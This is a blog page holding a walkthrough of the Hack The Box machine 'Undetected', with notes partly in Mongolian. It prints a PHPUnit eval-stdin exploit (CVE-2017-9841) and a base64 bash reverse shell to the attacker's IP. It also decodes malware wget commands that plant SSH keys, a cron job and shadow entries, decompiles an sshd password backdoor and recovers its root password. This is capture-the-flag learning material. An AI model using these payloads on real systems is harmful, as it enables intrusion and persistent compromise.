<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Undetected | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - Undetected - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-03-09-htb-undetected-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-03-09-htb-undetected-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-195170229-1","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Undetected"><meta property="og:description" content="HTB - Undetected - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-03-09-htb-undetected-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-09T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-09T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - Undetected"><meta name=twitter:description content="HTB - Undetected - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Undetected","item":"https://cadil.github.io/posts/2024-03-09-htb-undetected-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Undetected","name":"HTB - Undetected","description":"HTB - Undetected - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"1. IP Address # Machine Address 10.10.11.146 # Local Address 10.10.14.68 2. Nmap Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 05:40 EST Nmap scan report for 10.10.11.146 Host is up (0.23s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2 (protocol 2.0) | ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA) | 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA) |_ 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Diana's Jewelry |_http-server-header: Apache/2.4.41 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.05 seconds 3. Gobuster store. -\u003e /etc/hosts\ngobuster dir -u http://store.djewelry.htb/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://store.djewelry.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/03/08 05:55:38 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 325] [--\u003e http://store.djewelry.htb/images/] /css (Status: 301) [Size: 322] [--\u003e http://store.djewelry.htb/css/] /js (Status: 301) [Size: 321] [--\u003e http://store.djewelry.htb/js/] /vendor (Status: 301) [Size: 325] [--\u003e http://store.djewelry.htb/vendor/] /fonts (Status: 301) [Size: 324] [--\u003e http://store.djewelry.htb/fonts/] /server-status (Status: 403) [Size: 283] [[1;5C Progress: 152160 / 220561 (68.99%) [ERROR] 2022/03/08 06:07:42 [!] context deadline exceeded (Client.Timeout or context cancellation while reading body) vendor 4. CVE-2017-9841 cli:\n$ curl --data \"\u003c?php echo(pi());\" http://localhost:8888/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php Source: http://web.archive.org/web/20170701212357/http://phpunit.vulnbusters.com/ cli:\ncurl --data \"\u003c?php echo(pi());\" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ## 3.1415926535898 cli:\ncurl --data \"\u003c?php echo(shell_exec('whoami'));?\u003e\" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ## www-data 4.1 Reverse shell cli:\necho \"bash -i \u003e\u0026 /dev/tcp/10.10.14.68/9001 0\u003e\u00261\" | base64 ## YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OC85MDAxIDA+JjEK ## curl --data \" \u003c?php echo(shell_exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OC85MDAxIDA+JjEK | base64 -d | bash'));?\u003e\" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ## nc -lvnp 9001 4.2 Shell balance python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ctrl+z\nstty raw -echo f+g [enter enter] буцаад nc орлоо\nexport TERM=xterm 4.3 steven1 passwd:\nsteven1:x:1000:1000:,,,:/home/steven:/bin/bash steven1\nlinpeas хэрэгтэй олдоц:\n-r-x------ 1 www-data www-data 27296 May 14 2021 /var/backups/info 17793 4 -rw-rw---- 1 steven mail 966 Jul 25 2021 /var/mail/steven 17793 4 -rw-rw---- 1 steven mail 966 Jul 25 2021 /var/spool/mail/steven ╔══════════╣ Sudo version ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.31 info -г local machine руу хуулаад харвал:\nstrings info | less /bin/bash 776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b xxd -r -p\necho 776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b | xxd -r -p Output:\nwget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo \"* 3 * * * root /var/lib/.main\" \u003e\u003e /etc/crontab; awk -F\":\" '$7 == \"/bin/bash\" \u0026\u0026 $3 \u003e= 1000 {system(\"echo \"$1\"1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: \u003e\u003e /etc/shadow\")}' /etc/passwd; awk -F\":\" '$7 == \"/bin/bash\" \u0026\u0026 $3 \u003e= 1000 {system(\"echo \"$1\" \"$3\" \"$6\" \"$7\" \u003e users.txt\")}' /etc/passwd; while read -r user group home shell _; do echo \"$user\"1\":x:$group:$group:,,,:$home:$shell\" \u003e\u003e /etc/passwd; done \u003c users.txt; rm users.txt; hash\n$11:$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: өөрчлөлт \\-г хасаж, $11 - нэмсэн\n4.4 Hash rockyou:\nls -lh /usr/share/wordlists/ gunzip /usr/share/wordlists/rockyou.txt.gz cli:\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt out:\nUsing default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ihatehackers ($11) 1g 0:00:00:40 DONE (2022-03-08 07:20) 0.02484g/s 2213p/s 2213c/s 2213C/s jojo95..halo03 Use the \"--show\" option to display all of the cracked passwords reliably Session completed steven1 ihatehackers\nsu steven1 ## id uid=1000(steven) gid=1000(steven) groups=1000(steven) user.txt\n82bf31******* 5. Privilege escalation cli:\nssh steven1@10.10.11.146 /var/mail/steven:\nReceived: from production (localhost [127.0.0.1]) by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847 for ; Sun, 25 Jul 2021 10:31:12 GMT Received: (from root@localhost) by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847; Sun, 25 Jul 2021 10:31:12 GMT Date: Sun, 25 Jul 2021 10:31:12 GMT Message-Id: \u003c202107251031.80FAcdZ171847@production\u003e To: steven@production From: root@production Subject: Investigations Hi Steven. We recently updated the system but are still experiencing some strange behaviour with the Apache service. We have temporarily moved the web store and database to another server whilst investigations are underway. If for any reason you need access to the database or web application code, get in touch with Mark and he will generate a temporary password for you to authenticate to the temporary server. Thanks, sysadmin cli:\nfind / -type d 2\u003e/dev/null | grep -i apache2 ``/usr/lib/apache2/modules -ltrh` - сүүлийн өөрчлөлт\nsteven@production:/usr/lib/apache2/modules$ ls -ltrh total 8.6M -rw-r--r-- 1 root root 34K May 17 2021 mod_reader.so -rw-r--r-- 1 root root 4.5M Nov 25 23:16 libphp7.4.so 5.1 Ghidra: https://github.com/NationalSecurityAgency/ghidra/releases\nunzip ghidra_*_PUBLIC_*.zip mod_reader.so\n# Local VM: nc -lvnp 9001 \u003e mod_reader.so # Machine VM: nc 10.10.14.68 9001 \u003c mode_reader.so md5sum хоёр талд шалгана.\nstrings комманд ашиглан шалгана.\n# strings mod_reader.so # Base64 d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk base64 decode:\necho d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk | base64 -d wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd /usr/sbin/sshd:\n# Machine VM cd /usr/sbin ls -al | grep -i sshd # result steven@production:/usr/sbin$ ls -al | grep -i sshd -rwxr-xr-x 1 root root 3644664 Apr 13 2020 sshd sshd Ghidra Decompile decomiple.c дотор бүгдийн save:\ncat decomiple.c ### /* WARNING: Could not reconcile some variable overlaps */ int auth_password(ssh *ssh,char *password) { Authctxt *ctxt; passwd *ppVar1; int iVar2; uint uVar3; byte *pbVar4; byte *pbVar5; size_t sVar6; byte bVar7; int iVar8; long in_FS_OFFSET; char backdoor [31]; byte local_39 [9]; long local_30; bVar7 = 0xd6; ctxt = (Authctxt *)ssh-\u003eauthctxt; local_30 = *(long *)(in_FS_OFFSET + 0x28); backdoor._28_2_ = 0xa9f4; ppVar1 = ctxt-\u003epw; iVar8 = ctxt-\u003evalid; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor[30] = -0x5b; backdoor._0_4_ = 0xf0e7abd6; backdoor._4_4_ = 0xa4b3a3f3; backdoor._8_4_ = 0xf7bbfdc8; backdoor._12_4_ = 0xfdb3d6e7; pbVar4 = (byte *)backdoor; while( true ) { pbVar5 = pbVar4 + 1; *pbVar4 = bVar7 ^ 0x96; if (pbVar5 == local_39) break; bVar7 = *pbVar5; pbVar4 = pbVar5; } iVar2 = strcmp(password,backdoor); uVar3 = 1; if (iVar2 != 0) { sVar6 = strlen(password); uVar3 = 0; if (sVar6 \u003c 0x401) { if ((ppVar1-\u003epw_uid == 0) \u0026\u0026 (options.permit_root_login != 3)) { iVar8 = 0; } if ((*password != '\\0') || (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) { if (auth_password::expire_checked == 0) { auth_password::expire_checked = 1; iVar2 = auth_shadow_pwexpired(ctxt); if (iVar2 != 0) { ctxt-\u003eforce_pwchange = 1; } } iVar2 = sys_auth_passwd(ssh,password); if (ctxt-\u003eforce_pwchange != 0) { auth_restrict_session(ssh); } uVar3 = (uint)(iVar2 != 0 \u0026\u0026 iVar8 != 0); } } } if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) { return uVar3; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } bVar7 = 0xd6; ctxt = (Authctxt *)ssh-\u003eauthctxt; local_30 = *(long *)(in_FS_OFFSET + 0x28); backdoor._28_2_ = 0xa9f4; ppVar1 = ctxt-\u003epw; iVar8 = ctxt-\u003evalid; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor[30] = -0x5b; backdoor._0_4_ = 0xf0e7abd6; backdoor._4_4_ = 0xa4b3a3f3; backdoor._8_4_ = 0xf7bbfdc8; backdoor._12_4_ = 0xfdb3d6e7; pbVar4 = (byte *)backdoor; bVar7 = 0xd6; ctxt = (Authctxt *)ssh-\u003eauthctxt; local_30 = *(long *)(in_FS_OFFSET + 0x28); ppVar1 = ctxt-\u003epw; iVar8 = ctxt-\u003evalid; backdoor[30] = -0x5b; backdoor._28_2_ = 0xa9f4; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor._12_4_ = 0xfdb3d6e7; backdoor._8_4_ = 0xf7bbfdc8; backdoor._4_4_ = 0xa4b3a3f3; backdoor._0_4_ = 0xf0e7abd6; pbVar4 = (byte *)backdoor; clean хийгээд харвал:\nbackdoor[30] = -0x5b; backdoor._28_2_ = 0xa9f4; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor._12_4_ = 0xfdb3d6e7; backdoor._8_4_ = 0xf7bbfdc8; backdoor._4_4_ = 0xa4b3a3f3; backdoor._0_4_ = 0xf0e7abd6; -0x5b means:\nbackdoor[30] = 0xa5; backdoor._28_2_ = 0xa9f4; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor._12_4_ = 0xfdb3d6e7; backdoor._8_4_ = 0xf7bbfdc8; backdoor._4_4_ = 0xa4b3a3f3; backdoor._0_4_ = 0xf0e7abd6; 5.2 CyperChef 0xa5 0xa9f4 0xbcf0b5e3 0xb2d6f4a0fda0b3d6 0xfdb3d6e7 0xf7bbfdc8 0xa4b3a3f3 0xf0e7abd6 https://en.wikipedia.org/wiki/Endianness https://en.wikipedia.org/wiki/Hexadecimal https://en.wikipedia.org/wiki/Blob https://en.wikipedia.org/wiki/Exclusive_or char backdoor [31]; -\u003e result\nd6 ab e7 f0 f3 a3 b3 a4 c8 fd bb f7 e7 d6 b3 fd d6 b3 a0 fd a0 f4 d6 b2 e3 b5 f0 bc f4 a9 a5 from HEX: blob\nÖ«çðó£³¤Èý»÷çÖ³ýÖ³ ý ôÖ²ãµð¼ô©¥ XOR: key 96?\nwhile loop with XOR: 0x96 all in CyperChef https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)\u0026input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg\n@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3 5.3 SSH ssh root@10.10.11.146 password: @=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3 root.txt\nb49ed54********** ","wordCount":"1246","inLanguage":"mn","datePublished":"2024-03-09T00:00:00Z","dateModified":"2024-03-09T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-03-09-htb-undetected-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=Архив><span>Архив</span></a></li><li><a href=https://cadil.github.io/search/ title=Хайлт><span>Хайлт</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>Нүүр</a>&nbsp;»&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - Undetected</h1><div class=post-description>HTB - Undetected - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-03-09 00:00:00 +0000 UTC'>гуравдугаар сар 9, 2024</span>&nbsp;·&nbsp;6 МИН&nbsp;·&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Агуулга</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap aria-label="2. Nmap">2. Nmap</a></li><li><a href=#3-gobuster aria-label="3. Gobuster">3. Gobuster</a></li><li><a href=#4-cve-2017-9841 aria-label="4. CVE-2017-9841">4. CVE-2017-9841</a><ul><li><a href=#41-reverse-shell aria-label="4.1 Reverse shell">4.1 Reverse shell</a></li><li><a href=#42-shell-balance aria-label="4.2 Shell balance">4.2 Shell balance</a></li><li><a href=#43-steven1 aria-label="4.3 steven1">4.3 steven1</a></li><li><a href=#44-hash aria-label="4.4 Hash">4.4 Hash</a></li></ul></li><li><a href=#5-privilege-escalation aria-label="5. Privilege escalation">5. Privilege escalation</a><ul><li><a href=#51-ghidra aria-label="5.1 Ghidra:">5.1 Ghidra:</a></li><li><a href=#52-cyperchef aria-label="5.2 CyperChef">5.2 CyperChef</a></li><li><a href=#53-ssh aria-label="5.3 SSH">5.3 SSH</a></li></ul></li></ul></div></details></div><div class=post-content><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine Address</span>
</span></span><span style=display:flex><span>10.10.11.146
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Local Address</span>
</span></span><span style=display:flex><span>10.10.14.68
</span></span></code></pre></div><h3 id=2-nmap>2. Nmap<a hidden class=anchor aria-hidden=true href=#2-nmap>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-03-08 05:40 EST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.146
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.23s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-title: Diana<span style=color:#960050;background-color:#1e0010>&#39;</span>s Jewelry
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 22.05 seconds
</span></span></code></pre></div><h3 id=3-gobuster>3. Gobuster<a hidden class=anchor aria-hidden=true href=#3-gobuster>#</a></h3><p>store. -> /etc/hosts</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u http://store.djewelry.htb/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style=color:#ae81ff>50</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://store.djewelry.htb/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/03/08 05:55:38 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/images               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 325<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://store.djewelry.htb/images/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/css                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 322<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://store.djewelry.htb/css/<span style=color:#f92672>]</span>   
</span></span><span style=display:flex><span>/js                   <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 321<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://store.djewelry.htb/js/<span style=color:#f92672>]</span>    
</span></span><span style=display:flex><span>/vendor               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 325<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://store.djewelry.htb/vendor/<span style=color:#f92672>]</span>
